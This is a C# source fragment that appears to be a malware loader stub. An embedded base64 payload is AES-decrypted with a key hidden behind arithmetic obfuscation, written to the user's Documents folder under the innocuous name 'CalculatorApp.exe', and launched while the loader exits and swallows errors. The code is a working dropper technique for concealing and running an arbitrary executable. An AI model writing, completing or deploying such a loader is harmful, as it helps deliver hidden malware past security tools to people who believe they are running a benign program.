        // -------------------------------
        // PAYLOAD DECRYPTION & LAUNCH
        // -------------------------------
        private void M14_DecryptAndRun()
        {
            try
            {
                // 1) Base64 → bytes
                byte[] enc = Convert.FromBase64String(b64);

                // 2) Split IV + ciphertext
                byte[] iv = new byte[16];
                byte[] ct = new byte[enc.Length - 16];
                Array.Copy(enc, 0, iv, 0, 16);
                Array.Copy(enc, 16, ct, 0, ct.Length);

                // 3) Rebuild AES key
                byte[] key = M15_RebuildKey();

                // 4) Decrypt
                byte[] dec;
                using (Aes aes = Aes.Create())
                {
                    aes.Key = key; aes.IV = iv;
                    aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7;
                    using (var ms = new MemoryStream())
                    using (var cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(ct, 0, ct.Length);
                        cs.FlushFinalBlock();
                        dec = ms.ToArray();
                    }
                }

                // 5) Sanity check
                if (dec.Length < 1024)
                {
                    MessageBox.Show("Decryption failed!", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                    return;
                }

                // 6) Write real EXE
                string d = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "CalculatorApp");
                Directory.CreateDirectory(d);
                string re = Path.Combine(d, "CalculatorApp.exe");
                File.WriteAllBytes(re, dec);

                // 7) Launch it
                Process.Start(re);

                // 8) Exit loader
                Application.Current.Shutdown();
            }
            catch { }
        }

        /// <summary>Reverse the math obfuscation to yield the AES key.</summary>
        private byte[] M15_RebuildKey()
        {
            byte[] k = new byte[kp.Length];
            for (int i = 0; i < kp.Length; i++)
                k[i] = (byte)((kp[i] - 7) / (i + 2));
            return k;
        }

